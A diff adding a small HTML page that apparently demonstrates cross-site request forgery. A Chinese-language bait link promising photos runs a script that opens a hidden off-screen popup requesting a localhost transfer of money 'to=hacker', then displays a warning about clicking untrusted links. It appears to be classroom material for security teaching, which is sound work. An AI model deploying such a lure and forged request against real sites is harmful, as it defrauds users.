@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <div id="el">
+        <p>5G高清美女照片，赶快<a href="javascript:transfer()">点击下载</a>吧！</p>
+        <img id="img" width="300" src="http://img.zlib.cn/beauty/1.jpg" />
+    </div>
+    <script>
+        function transfer() {
+            open('http://localhost:3000/transfer?to=hacker&money=100', '', 'width=300,height=100,left=5000,top=5000')
+            const h2 = document.createElement('h2')
+            h2.innerHTML = '不该点的链接不要点，贪婪是原罪！'
+            el.appendChild(h2)
+            // fetch('http://localhost:3000/transfer?to=hacker&money=100').then(res => {
+            //     console.log('res', res)
+            // })
+        }
+    </script>
+</body>
+
+</html>
